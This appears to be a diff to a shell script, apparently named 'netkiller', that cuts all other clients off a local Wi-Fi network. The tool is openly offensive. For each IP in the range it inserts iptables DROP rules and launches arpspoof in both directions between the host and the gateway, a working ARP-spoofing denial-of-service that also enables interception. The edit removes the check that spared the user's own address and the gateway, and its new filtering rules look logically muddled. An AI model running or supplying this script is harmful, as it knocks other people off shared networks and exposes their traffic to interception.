@@ -38,14 +38,15 @@ chmod 755 /bin/netkiller-stop
 
 for (( i = MIN; i <= MAX; i++ )); do
     IP=$(dec2ip "$i")
-    if [[ "$IP" != "$MYIP" && "$IP" != "$GATEWAY" ]]; then
-        # Block traffic
-        iptables -I FORWARD -s "$IP" -j DROP
-        iptables -I FORWARD -d "$IP" -j DROP
-        # ARP spoofing
-        arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
-        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
-    fi
+
+# Drop all the packets except your IP source and destination (bidirectional)
+iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
+iptables -I FORWARD ! -d "$GATEWAY" -s "$MYIP" -j DROP
+
+# Spoofing all the users ARP
+arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
+arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
+
 done
 
 echo "Blocking all the wifi clients connections in $NETWORK_CIDR except your $MYIP and $GATEWAY."
